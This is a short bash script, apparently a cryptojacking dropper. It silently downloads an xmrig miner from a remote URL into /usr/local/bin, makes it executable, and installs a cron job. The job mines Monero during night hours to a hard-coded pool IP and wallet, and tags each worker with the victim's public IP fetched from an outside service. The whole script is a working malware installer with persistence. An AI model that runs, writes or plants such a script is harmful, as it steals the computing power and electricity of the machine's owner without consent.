#!/bin/bash
export DIRECTORY="/usr/local/bin"
export DOWNLOAD_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
# Check if xmrig file exists
if [ ! -f "$DIRECTORY/xmrig" ]; then
    # Download xmrig
    curl -s -o "$DIRECTORY/xmrig" "$DOWNLOAD_URL"
    if [ $? -ne 0 ]; then
        echo "Failed to download xmrig."
        exit 1
    fi
    # Set permissions
    chmod +x "$DIRECTORY/xmrig"
fi

# Schedule cron job
(crontab -l 2>/dev/null; echo "0 0-5 * * * /usr/local/bin/xmrig --url=38.47.101.33:443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=\$(curl 4.ipw.cn)-Auto -k --coin monero --tls --t=2") | crontab -
